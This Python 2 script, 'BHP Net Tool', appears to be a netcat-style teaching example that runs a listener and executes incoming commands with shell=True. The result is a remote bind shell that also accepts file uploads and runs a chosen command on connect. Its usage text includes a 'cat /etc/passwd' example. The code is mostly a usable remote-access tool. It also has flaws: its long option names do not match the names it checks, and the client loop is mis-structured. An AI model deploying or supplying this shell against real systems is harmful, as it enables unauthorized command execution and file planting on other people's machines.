import sys
import socket
import getopt
import threading
import subprocess

# define global variables
listen = False
command = False
upload = ""
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l listen                     - sniff the connection [host]:[port]"
    print "-e --execute=file_to_run      - file to be excuted on connected"
    print "-c --command                  - launch command line shell"
    print "-u --upload=destination       - upload file after connecting"
    print
    print
    print "Example: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=/tmp/target.sh"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGGI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def client_handler(client_socket):
    global upload
    global execute
    global command
    
    # check upload
    if len(upload_destination):
        file_buffer = ""
        
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        
        try:
            # wb: write file as binary format
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
            
    # check execute
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)
    
    if command:
        print "command mode"
        while True:
            client_socket.send("<BHP:#> ")
            # continue to receive data until get LF (Enter)
            cmd_buffer = ""
            
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            print "cmd_buffer: %s" % cmd_buffer
            response = run_command(cmd_buffer)
            print "response: %s" % response
            client_socket.send(response)
            
def server_loop():
    global target
    
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
        
    while True:
        client_socket, addr = server.accept()
        print "client addr: %s" % addr[0]
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
    
def run_command(command):
    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "fail to execute command. \r\n"
    
    return output

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
        
        while True:
            recv_len = 1
            response = ""
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                
                if recv_len < 4096:
                    break
        print response
        
        buffer = raw_input("")
        buffer += "\n"
        
        client.send(buffer)
        
    except:
        print "[*] Exception! Exiting."
        client.close()

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                                   ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execution"):
            execute = a
        elif o in ("-c","--commandshell"):
            print "command is true"
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            print "target: %s" % a
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "option is not supported"
            
    # should we sniff or just transmit data from stdin
    if not listen and len(target) and port > 0:
        # read buffer from command line
        # blocking, press CTRL-D if want to send EOF()
        buffer = sys.stdin.read()
        
        # send out the data
        client_sender(buffer)
    if listen:
        server_loop()
        
main()